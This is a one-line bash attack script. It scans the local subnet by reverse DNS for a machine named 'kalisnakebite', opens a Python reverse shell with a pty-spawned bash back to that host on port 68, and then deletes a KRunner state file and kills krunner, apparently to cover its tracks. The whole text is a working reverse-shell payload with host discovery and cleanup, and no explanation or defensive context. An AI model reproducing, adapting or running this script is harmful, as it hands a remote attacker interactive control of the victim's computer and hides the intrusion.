#!/bin/bash
attacker="kalisnakebite"; interface=$(\ip route | grep -i "default" | cut -d " " -f 5); ip_prefix=$(\ip a | grep -i "$interface" | grep -i inet | awk '{print $2}' | cut -d "/" -f1 | cut -d '.' -f-3); cidr=$(\ip a | grep -i "$interface" | grep -i inet | awk '{print $2}' | cut -d "/" -f2); total_ip=$((2**$((32-$cidr))-1)); subnets_count=$(($total_ip / 255)); rm -f /tmp/$attacker; host=4; for (( subnet=1; subnet<=$subnets_count; subnet++ )); do while [[ $host -le 255 ]] ; do [[ -f /tmp/$attacker ]] && break; check_ip() { [[ ! -f /tmp/$attacker ]] && { ip="$1"; [[ "$(python3 -c "import socket; print(socket.getfqdn('$ip'))")" = "$attacker" ]] && echo $ip > /tmp/$attacker ; } }; check_ip "${ip_prefix}.$(($host - 7))" & check_ip "${ip_prefix}.$(($host - 6))" & check_ip "${ip_prefix}.$(($host - 5))" & check_ip "${ip_prefix}.$(($host - 4))" & check_ip "${ip_prefix}.$(($host - 3))" & check_ip "${ip_prefix}.$(($host - 2))" & check_ip "${ip_prefix}.$(($host - 1))" & check_ip "${ip_prefix}.${host}"; host=$(($host + 8)); done; ip_prefix=$(echo $ip_prefix | cut -d '.' -f-2)"."$(($(echo $ip_prefix | cut -d '.' -f3) + 1)); done; wait; attacker_ip=$(cat /tmp/$attacker); rm -f /tmp/$attacker; python3 -c "import os,pty,socket;s=socket.socket();s.connect(('$attacker_ip',68));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn('/bin/bash')" & rm -rf ~/.local/share/krunnerstaterc; pkill krunner